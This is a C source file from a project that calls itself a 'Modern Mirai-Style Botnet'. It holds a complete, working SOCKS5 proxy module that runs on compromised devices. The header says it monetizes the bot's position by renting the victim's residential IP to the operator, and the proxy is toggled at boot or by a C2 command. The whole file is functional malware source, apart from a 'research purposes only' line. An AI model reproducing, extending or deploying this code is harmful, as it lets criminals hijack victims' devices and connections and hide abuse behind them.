/*
 * notnet - Modern Mirai-Style Botnet
 * proxy.c - Residential SOCKS5 forward proxy (#89)
 *
 * Research purposes only.
 *
 * SOCKS5 (RFC 1928) forward proxy that monetizes the bot's network position
 * as a residential proxy (the 911 S5 / ZeroAccess-successor pattern). The
 * operator rents the bot's egress IP by routing their traffic through it:
 *
 *   client --SOCKS5--> bot:proxy_port --> target host:port
 *
 * Flow per connection:
 *   1. Greeting  (VER=0x05, NMETHODS, methods)   -> server picks 0x02
 *   2. RFC 1929  (VER=0x01, ULEN, UNAME, PLEN, PASSWD)  token auth
 *   3. CONNECT   (VER, CMD=0x01, RSV, ATYP, DST) -> reply 0x00 then tunnel
 *
 * The accept loop runs in its own pthread (started from notnet.c at boot
 * when proxy_enabled=1, or at runtime via the `proxy on|off` command), so
 * the proxy never blocks the C2 main loop. Each accepted connection is
 * handled by a detached worker thread, capped at PROXY_MAX_CONNS.
 */
#include "proxy.h"
#include "util.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <pthread.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/select.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>

/* ── Module State ──────────────────────────────────────────── */
static pthread_t g_proxy_thread;
static pthread_mutex_t g_proxy_mutex = PTHREAD_MUTEX_INITIALIZER;
static volatile int g_proxy_running = 0;   /* accept loop is up */
static volatile int g_proxy_stop = 0;      /* stop request for accept loop */
static int g_listener_fd = -1;
static int g_proxy_port = 0;               /* actual bound port */
static int g_proxy_conns = 0;              /* active worker threads */
static char g_proxy_token[64] = "";        /* RFC 1929 password */

/* ── Forward declarations (see static-function-order pitfall) ── */
static void *proxy_accept_loop(void *arg);
static void *proxy_conn_thread(void *arg);
static void proxy_spawn_conn(int cfd);
static void proxy_handle_client(int client);
static void proxy_tunnel(int a, int b);
static int proxy_tcp_connect(const char *host, uint16_t port, int timeout_ms);
static int proxy_recv_all(int fd, unsigned char *buf, int len, int timeout_ms);
static int proxy_send_all(int fd, const unsigned char *buf, int len);
static int proxy_const_cmp(const unsigned char *a, int alen, const char *b);

/* ── I/O Helpers ───────────────────────────────────────────── */
/* Read exactly len bytes into buf, select-bounded. Returns 0 on success,
 * -1 on timeout/EOF/error. */
static int proxy_recv_all(int fd, unsigned char *buf, int len, int timeout_ms) {
    int got = 0;
    while (got < len) {
        fd_set rfds;
        FD_ZERO(&rfds);
        FD_SET(fd, &rfds);
        struct timeval tv;
        tv.tv_sec = timeout_ms / 1000;
        tv.tv_usec = (timeout_ms % 1000) * 1000;
        int sel = select(fd + 1, &rfds, NULL, NULL, &tv);
        if (sel <= 0) return -1;
        int n = recv(fd, buf + got, len - got, 0);
        if (n <= 0) return -1;
        got += n;
    }
    return 0;
}

/* Send the whole buffer, checking each send(). Returns 0 on success. */
static int proxy_send_all(int fd, const unsigned char *buf, int len) {
    int sent = 0;
    while (sent < len) {
        int n = send(fd, buf + sent, len - sent, 0);
        if (n <= 0) return -1;
        sent += n;
    }
    return 0;
}

/* SECURITY FIX (#11): constant-time token comparison to defeat the timing
 * side-channel in the proxy password check. Returns 0 on match. */
static int proxy_const_cmp(const unsigned char *a, int alen, const char *b) {
    int blen = (int)strlen(b);
    if (alen != blen) return 1;
    int diff = 0;
    for (int i = 0; i < alen; i++) {
        diff |= (a[i] ^ (unsigned char)b[i]);
    }
    return diff;
}

/* ── Outbound connect (bounded, non-blocking + select) ────── */
static int proxy_tcp_connect(const char *host, uint16_t port, int timeout_ms) {
    struct addrinfo hints, *res = NULL;
    memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_INET;          /* IPv4 destinations only */
    hints.ai_socktype = SOCK_STREAM;
    char portstr[8];
    snprintf(portstr, sizeof(portstr), "%u", (unsigned)port);

    int err = getaddrinfo(host, portstr, &hints, &res);
    if (err != 0) return -1;

    int sock = -1;
    for (struct addrinfo *ai = res; ai; ai = ai->ai_next) {
        sock = socket(ai->ai_family, ai->ai_socktype, ai->ai_protocol);
        if (sock < 0) continue;

        int fl = fcntl(sock, F_GETFL, 0);
        if (fl < 0 || fcntl(sock, F_SETFL, fl | O_NONBLOCK) < 0) {
            close(sock); sock = -1; continue;
        }
        int c = connect(sock, ai->ai_addr, ai->ai_addrlen);
        if (c != 0 && errno != EINPROGRESS) {
            close(sock); sock = -1; continue;
        }
        fd_set wfds;
        FD_ZERO(&wfds);
        FD_SET(sock, &wfds);
        struct timeval tv;
        tv.tv_sec = timeout_ms / 1000;
        tv.tv_usec = (timeout_ms % 1000) * 1000;
        int sel = select(sock + 1, NULL, &wfds, NULL, &tv);
        if (sel <= 0) {
            close(sock); sock = -1; continue;
        }
        int soerr = 0;
        socklen_t elen = sizeof(soerr);
        if (getsockopt(sock, SOL_SOCKET, SO_ERROR, &soerr, &elen) < 0 || soerr != 0) {
            close(sock); sock = -1; continue;
        }
        fcntl(sock, F_SETFL, fl);   /* back to blocking for the tunnel */
        break;
    }

    freeaddrinfo(res);
    return sock;
}

/* ── CONNECT tunnel ────────────────────────────────────────── */
/* Bidirectional relay between two fds with bounded 4KB buffers and an idle
 * timeout. Both fds are left open; the caller closes them. */
static void proxy_tunnel(int a, int b) {
    char ba[PROXY_BUF_SIZE];
    char bb[PROXY_BUF_SIZE];
    int a_closed = 0, b_closed = 0;

    while (!a_closed || !b_closed) {
        fd_set rfds;
        FD_ZERO(&rfds);
        int maxfd = -1;
        if (!a_closed) { FD_SET(a, &rfds); if (a > maxfd) maxfd = a; }
        if (!b_closed) { FD_SET(b, &rfds); if (b > maxfd) maxfd = b; }
        struct timeval tv;
        tv.tv_sec = PROXY_TUNNEL_TIMEOUT / 1000;
        tv.tv_usec = (PROXY_TUNNEL_TIMEOUT % 1000) * 1000;
        int sel = select(maxfd + 1, &rfds, NULL, NULL, &tv);
        if (sel <= 0) break;    /* idle timeout or error: end the tunnel */

        if (!a_closed && FD_ISSET(a, &rfds)) {
            int n = recv(a, ba, sizeof(ba), 0);
            if (n == 0) {
                /* a half-closed: propagate its FIN as SHUT_WR on b so the
                 * peer sees EOF promptly instead of waiting for the idle
                 * timeout (#228). b may still send data back. */
                shutdown(b, SHUT_WR);
                a_closed = 1;
            } else if (n < 0) {
                /* read error: no meaningful state left, end the tunnel */
                a_closed = 1; b_closed = 1;
            } else if (proxy_send_all(b, (unsigned char *)ba, n) != 0) {
                a_closed = 1; b_closed = 1;
            }
        }
        if (!b_closed && FD_ISSET(b, &rfds)) {
            int n = recv(b, bb, sizeof(bb), 0);
            if (n == 0) {
                /* mirror of the a->b case above: propagate b's FIN (#228) */
                shutdown(a, SHUT_WR);
                b_closed = 1;
            } else if (n < 0) {
                a_closed = 1; b_closed = 1;
            } else if (proxy_send_all(a, (unsigned char *)bb, n) != 0) {
                a_closed = 1; b_closed = 1;
            }
        }
    }
}

/* ── Per-connection protocol handler ───────────────────────── */
static void proxy_handle_client(int client) {
    unsigned char buf[PROXY_BUF_SIZE];

    /* 1. Greeting: VER NMETHODS METHODS */
    if (proxy_recv_all(client, buf, 2, PROXY_HANDSHAKE_TIMEOUT) != 0) return;
    if (buf[0] != 0x05) return;                 /* not SOCKS5: just close */
    int nmethods = buf[1];
    if (nmethods < 1) return;
    unsigned char methods[255];
    if (proxy_recv_all(client, methods, nmethods, PROXY_HANDSHAKE_TIMEOUT) != 0) return;

    /* Auth is mandatory: pick RFC 1929 user/pass if offered, else refuse. */
    int use_auth = 0;
    for (int i = 0; i < nmethods; i++) {
        if (methods[i] == 0x02) { use_auth = 1; break; }
    }
    if (!use_auth) {
        unsigned char rep[2] = { 0x05, 0xFF };  /* no acceptable method */
        proxy_send_all(client, rep, 2);
        return;
    }
    unsigned char method[2] = { 0x05, 0x02 };
    if (proxy_send_all(client, method, 2) != 0) return;

    /* 2. RFC 1929 username/password sub-negotiation (token = password).
     * Wire format: VER | ULEN | UNAME | PLEN | PASSWD — there is NO second
     * VER byte between UNAME and PLEN. */
    if (proxy_recv_all(client, buf, 2, PROXY_HANDSHAKE_TIMEOUT) != 0) return;
    if (buf[0] != 0x01) return;                 /* must be version 1 */
    int ulen = buf[1];
    if (proxy_recv_all(client, buf, ulen, PROXY_HANDSHAKE_TIMEOUT) != 0) return;
    /* username ignored — possession of the token is what matters */
    if (proxy_recv_all(client, buf, 1, PROXY_HANDSHAKE_TIMEOUT) != 0) return;
    int plen = buf[0];
    unsigned char pass[256];
    if (plen < 1 || proxy_recv_all(client, pass, plen, PROXY_HANDSHAKE_TIMEOUT) != 0) {
        unsigned char arep[2] = { 0x01, 0x01 };
        proxy_send_all(client, arep, 2);
        return;
    }
    int ok = proxy_const_cmp(pass, plen, g_proxy_token);
    /* RFC 1929: STATUS=0 means success, STATUS=1 means failure.
     * proxy_const_cmp returns 0 on match, so: match → STATUS=0 (success),
     * mismatch → STATUS=1 (failure). */
    unsigned char arep[2] = { 0x01, ok ? 0x01 : 0x00 };
    if (proxy_send_all(client, arep, 2) != 0) return;
    if (ok) return;                             /* auth failed: close */

    /* 3. CONNECT request: VER CMD RSV ATYP */
    if (proxy_recv_all(client, buf, 4, PROXY_HANDSHAKE_TIMEOUT) != 0) return;
    if (buf[0] != 0x05) return;
    unsigned char cmd = buf[1], atyp = buf[3];
    if (cmd != 0x01) {                          /* CONNECT only */
        unsigned char rep[10] = { 0x05, 0x07, 0x00, 0x01, 0,0,0,0, 0,0 };
        proxy_send_all(client, rep, sizeof(rep));
        return;
    }

    char host[256];
    uint16_t port = 0;
    int rep_code = 0x08;                        /* address type not supported */
    if (atyp == 0x01) {                         /* IPv4 */
        if (proxy_recv_all(client, buf, 6, PROXY_HANDSHAKE_TIMEOUT) != 0) return;
        char ip[INET_ADDRSTRLEN];
        if (!inet_ntop(AF_INET, buf, ip, sizeof(ip))) return;
        snprintf(host, sizeof(host), "%s", ip);
        port = (uint16_t)((buf[4] << 8) | buf[5]);
        rep_code = 0x00;
    } else if (atyp == 0x03) {                  /* domain */
        if (proxy_recv_all(client, buf, 1, PROXY_HANDSHAKE_TIMEOUT) != 0) return;
        int dlen = buf[0];
        if (dlen < 1) return;
        unsigned char dbuf[255];
        if (proxy_recv_all(client, dbuf, dlen, PROXY_HANDSHAKE_TIMEOUT) != 0) return;
        memcpy(host, dbuf, (size_t)dlen);
        host[dlen] = '\0';
        if (proxy_recv_all(client, buf, 2, PROXY_HANDSHAKE_TIMEOUT) != 0) return;
        port = (uint16_t)((buf[0] << 8) | buf[1]);
        rep_code = 0x00;
    }
    /* ATYP 0x04 (IPv6) and anything else fall through with rep_code 0x08. */

    if (rep_code != 0x00 || port == 0) {
        unsigned char rep[10] = { 0x05, 0x08, 0x00, 0x01, 0,0,0,0, 0,0 };
        rep[1] = (unsigned char)rep_code;
        proxy_send_all(client, rep, sizeof(rep));
        return;
    }

    /* 4. Connect to the destination. */
    int upstream = proxy_tcp_connect(host, port, PROXY_HANDSHAKE_TIMEOUT);
    if (upstream < 0) {
        unsigned char rep[10] = { 0x05, 0x05, 0x00, 0x01, 0,0,0,0, 0,0 };
        proxy_send_all(client, rep, sizeof(rep));
        return;
    }

    /* 5. Success reply: BND.ADDR 0.0.0.0, BND.PORT 0. */
    unsigned char rep[10] = { 0x05, 0x00, 0x00, 0x01, 0,0,0,0, 0,0 };
    if (proxy_send_all(client, rep, sizeof(rep)) != 0) {
        close(upstream);
        return;
    }

    /* 6. Tunnel raw bytes bidirectionally until EOF/timeout. */
    proxy_tunnel(client, upstream);
    close(upstream);
}

/* ── Connection worker ─────────────────────────────────────── */
static void *proxy_conn_thread(void *arg) {
    int cfd = *(int *)arg;
    free(arg);
    proxy_handle_client(cfd);
    close(cfd);
    pthread_mutex_lock(&g_proxy_mutex);
    if (g_proxy_conns > 0) g_proxy_conns--;
    pthread_mutex_unlock(&g_proxy_mutex);
    return NULL;
}

static void proxy_spawn_conn(int cfd) {
    pthread_mutex_lock(&g_proxy_mutex);
    int overload = (g_proxy_conns >= PROXY_MAX_CONNS);
    if (!overload) g_proxy_conns++;
    pthread_mutex_unlock(&g_proxy_mutex);

    if (overload) {
        /* Connection cap reached: polite method-reject, then close. */
        unsigned char rep[2] = { 0x05, 0xFF };
        proxy_send_all(cfd, rep, 2);
        close(cfd);
        return;
    }

    int *fdp = malloc(sizeof(int));
    if (!fdp) {
        pthread_mutex_lock(&g_proxy_mutex);
        if (g_proxy_conns > 0) g_proxy_conns--;
        pthread_mutex_unlock(&g_proxy_mutex);
        close(cfd);
        return;
    }
    *fdp = cfd;

    pthread_t t;
    if (pthread_create(&t, NULL, proxy_conn_thread, fdp) != 0) {
        free(fdp);
        pthread_mutex_lock(&g_proxy_mutex);
        if (g_proxy_conns > 0) g_proxy_conns--;
        pthread_mutex_unlock(&g_proxy_mutex);
        close(cfd);
        return;
    }
    pthread_detach(t);
}

/* ── Accept loop ───────────────────────────────────────────── */
static void *proxy_accept_loop(void *arg) {
    (void)arg;
    while (1) {
        if (g_proxy_stop) break;

        fd_set rfds;
        FD_ZERO(&rfds);
        pthread_mutex_lock(&g_proxy_mutex);
        int lfd = g_listener_fd;
        if (lfd >= 0) FD_SET(lfd, &rfds);
        pthread_mutex_unlock(&g_proxy_mutex);
        if (lfd < 0) break;

        struct timeval tv = { 0, 500000 };      /* 500ms: polls stop flag */
        int sel = select(lfd + 1, &rfds, NULL, NULL, &tv);
        if (sel < 0) {
            if (errno == EINTR) continue;
            log_warn("SOCKS5: listener select failed: %s", strerror(errno));
            break;
        }
        if (sel == 0) continue;                 /* timeout: re-check stop */
        if (g_proxy_stop) break;

        struct sockaddr_in peer;
        socklen_t plen = sizeof(peer);
        int cfd = accept(lfd, (struct sockaddr *)&peer, &plen);
        if (cfd < 0) {
            if (errno == EINTR || errno == EAGAIN || errno == ECONNABORTED) continue;
            log_warn("SOCKS5: accept failed: %s", strerror(errno));
            continue;
        }
        proxy_spawn_conn(cfd);
    }
    return NULL;
}

/* ── Public API ────────────────────────────────────────────── */
int proxy_start(notnet_bot_t *bot) {
    if (!bot) return -1;
    if (bot->proxy_token[0] == '\0') {
        log_warn("SOCKS5: proxy refused — no proxy_token configured");
        return -1;
    }

    pthread_mutex_lock(&g_proxy_mutex);
    if (g_proxy_running) {
        pthread_mutex_unlock(&g_proxy_mutex);
        return 0;                               /* already running: no-op */
    }

    int lfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (lfd < 0) {
        pthread_mutex_unlock(&g_proxy_mutex);
        return -1;
    }
    int one = 1;
    setsockopt(lfd, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one));
    struct sockaddr_in sa;
    memset(&sa, 0, sizeof(sa));
    sa.sin_family = AF_INET;
    sa.sin_addr.s_addr = htonl(INADDR_ANY);
    sa.sin_port = htons((uint16_t)bot->proxy_port);
    if (bind(lfd, (struct sockaddr *)&sa, sizeof(sa)) < 0) {
        log_warn("SOCKS5: bind 0.0.0.0:%u failed: %s",
                 (unsigned)bot->proxy_port, strerror(errno));
        close(lfd);
        pthread_mutex_unlock(&g_proxy_mutex);
        return -1;
    }
    if (listen(lfd, 32) < 0) {
        log_warn("SOCKS5: listen failed: %s", strerror(errno));
        close(lfd);
        pthread_mutex_unlock(&g_proxy_mutex);
        return -1;
    }

    g_listener_fd = lfd;
    g_proxy_port = bot->proxy_port;
    g_proxy_stop = 0;
    strncpy(g_proxy_token, bot->proxy_token, sizeof(g_proxy_token) - 1);
    g_proxy_token[sizeof(g_proxy_token) - 1] = '\0';

    if (pthread_create(&g_proxy_thread, NULL, proxy_accept_loop, NULL) != 0) {
        close(lfd);
        g_listener_fd = -1;
        pthread_mutex_unlock(&g_proxy_mutex);
        return -1;
    }
    g_proxy_running = 1;
    pthread_mutex_unlock(&g_proxy_mutex);

    log_info("SOCKS5: proxy listening on 0.0.0.0:%u", (unsigned)g_proxy_port);
    return 0;
}

void proxy_stop(void) {
    pthread_mutex_lock(&g_proxy_mutex);
    if (!g_proxy_running) {
        pthread_mutex_unlock(&g_proxy_mutex);
        return;
    }
    g_proxy_stop = 1;
    int lfd = g_listener_fd;
    g_listener_fd = -1;
    pthread_mutex_unlock(&g_proxy_mutex);

    if (lfd >= 0) close(lfd);                   /* wake the accept loop */
    pthread_join(g_proxy_thread, NULL);

    pthread_mutex_lock(&g_proxy_mutex);
    g_proxy_running = 0;
    g_proxy_stop = 0;
    g_proxy_port = 0;
    g_proxy_token[0] = '\0';
    pthread_mutex_unlock(&g_proxy_mutex);
    log_info("SOCKS5: proxy stopped");
}

int proxy_is_running(void) {
    pthread_mutex_lock(&g_proxy_mutex);
    int r = g_proxy_running;
    pthread_mutex_unlock(&g_proxy_mutex);
    return r;
}

int proxy_get_port(void) {
    pthread_mutex_lock(&g_proxy_mutex);
    int p = g_proxy_port;
    pthread_mutex_unlock(&g_proxy_mutex);
    return p;
}
